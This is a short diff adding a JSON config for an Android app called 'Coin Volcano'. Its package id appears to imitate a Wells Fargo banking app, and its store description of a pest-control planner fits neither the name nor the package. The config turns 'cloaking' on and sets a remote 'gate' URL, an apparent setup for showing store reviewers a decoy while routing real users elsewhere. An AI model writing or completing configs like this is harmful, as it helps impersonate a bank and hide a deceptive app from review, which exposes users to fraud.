@@ -1,0 +1,15 @@
+{
+  "package": "com.wf.wellsfargomob",
+  "name": "Coin Volcano",
+  "developer": "Radiant Drift Labs",
+  "apk_label": "Coin Volcano",
+  "play_summary": "Plan your pest control efforts and keep track of the treatments in Coin Volcano",
+  "version_name": "3.0",
+  "version_code": 3,
+  "min_sdk": 28,
+  "target_sdk": 36,
+  "agp": "8.11.2",
+  "kotlin": "2.3.0",
+  "cloaking": "да",
+  "gate": "https://pesthunter.site/yi0tl"
+}
